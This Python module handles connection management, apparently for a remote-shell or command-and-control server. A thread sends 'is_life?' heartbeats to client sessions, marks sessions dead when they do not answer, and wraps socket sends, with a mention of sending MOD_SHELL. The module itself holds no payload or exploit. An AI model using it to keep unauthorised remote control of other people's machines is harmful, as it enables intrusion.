import time
import threading
from prettytable import PrettyTable

from .handler import Handler

from .other import printColor
#connection management

class Management(threading.Thread):

    is_life = "is_life?" 
    """
    Send is life.
    If the customer responds when he wants.
    if the client does not respond then an exception is declared and management puts inactive status (dead) via CheckConn
    """
    def __init__(self,timeout):
        threading.Thread.__init__(self)
        self.timeout = timeout #How long for each check connexion.

    def run(self):
        while(True):
            
            time.sleep(self.timeout)
            for key in Handler.dict_conn.keys():
                if(Handler.dict_conn[key][3]): #Si la connexion est True (Vivante)
                    try:
                        #print(Handler.dict_conn[key][3])
                        Handler.dict_conn[key][0].send(Management.is_life.encode())
                    except ConnectionError as connerr: #If the connection does not answer
                        if(Handler.status_connection_display):
                            printColor("information","\n[-] The client's connection is disconnected")
                            printColor("error",str(connerr))
                        else:
                            pass
                        CheckConn().connexionIsDead(key) #Change status to dead (False)

                else:#If the connection is dead
                    #print(key, "connexion is dead no send msg")
                    pass 

class CheckConn:#Heritage on Session
    
    def connexionIsDead(self, nb_session):
        #print(Handler.dict_conn[nb_session][3])
        Handler.dict_conn[nb_session][3] = False
        #print(Handler.dict_conn)

    def safeSend(self, nb_session, sock, payload):
        '''
        Checks if the socket sending is not lost.
        Example: If the server sending MOD_SHELL is that at the moment the connection is cut then this function is really useful.
        If the server does not manage to contact the client then the connection is dead function is called.
        
        Returns true if the socket was sent if not retrun false if there was a problem.
        '''
        try:
            sock.send(payload)
        except ConnectionError as connerr: #If the connection does not answer
            if(Handler.status_connection_display):
                printColor("error","[-] The connection to the client was cut {}:{}.\n".format(Handler.dict_conn[nb_session][1],Handler.dict_conn[nb_session][2]))

            self.connexionIsDead(nb_session)
            return False
        
        return True
